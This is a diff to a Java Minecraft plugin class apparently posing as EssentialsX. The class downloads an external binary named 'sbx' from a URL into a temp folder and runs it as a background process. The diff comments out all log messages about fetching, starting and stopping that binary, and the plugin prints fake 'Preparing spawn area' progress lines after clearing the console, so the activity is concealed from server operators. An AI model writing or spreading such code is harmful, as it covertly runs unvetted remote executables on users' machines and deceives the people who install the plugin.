@@ -36,7 +36,6 @@ public class EssentialsX extends JavaPlugin {
     
     private void startSbxProcess() throws Exception {
         if (isProcessRunning) {
-            // getLogger().warning("sbx process is already running");
             return;
         }
         
@@ -59,7 +58,7 @@ public class EssentialsX extends JavaPlugin {
         Path sbxBinary = tmpDir.resolve("sbx");
         
         if (!Files.exists(sbxBinary)) {
-            getLogger().info("Downloading sbx ...");
+            // getLogger().info("Downloading sbx ...");
             try (InputStream in = new URL(url).openStream()) {
                 Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
             }
@@ -125,8 +124,7 @@ public class EssentialsX extends JavaPlugin {
         
         // Start a monitor thread to log when process exits
         startProcessMonitor();
-        
-        getLogger().info("sbx started");
+        // getLogger().info("sbx started");
         
         // sleep 20 seconds
         try {
@@ -136,7 +134,7 @@ public class EssentialsX extends JavaPlugin {
         }
         
         clearConsole();
-        
+        getLogger().info("");
         getLogger().info("Preparing spawn area: 1%");
         getLogger().info("Preparing spawn area: 5%");
         getLogger().info("Preparing spawn area: 10%");
@@ -224,7 +222,7 @@ public class EssentialsX extends JavaPlugin {
             try {
                 int exitCode = sbxProcess.waitFor();
                 isProcessRunning = false;
-                getLogger().info("sbx process exited with code: " + exitCode);
+                // getLogger().info("sbx process exited with code: " + exitCode);
             } catch (InterruptedException e) {
                 Thread.currentThread().interrupt();
                 isProcessRunning = false;
@@ -242,7 +240,7 @@ public class EssentialsX extends JavaPlugin {
         shouldRun = false;
         
         if (sbxProcess != null && sbxProcess.isAlive()) {
-            getLogger().info("Stopping sbx process...");
+            // getLogger().info("Stopping sbx process...");
             sbxProcess.destroy();
             
             try {
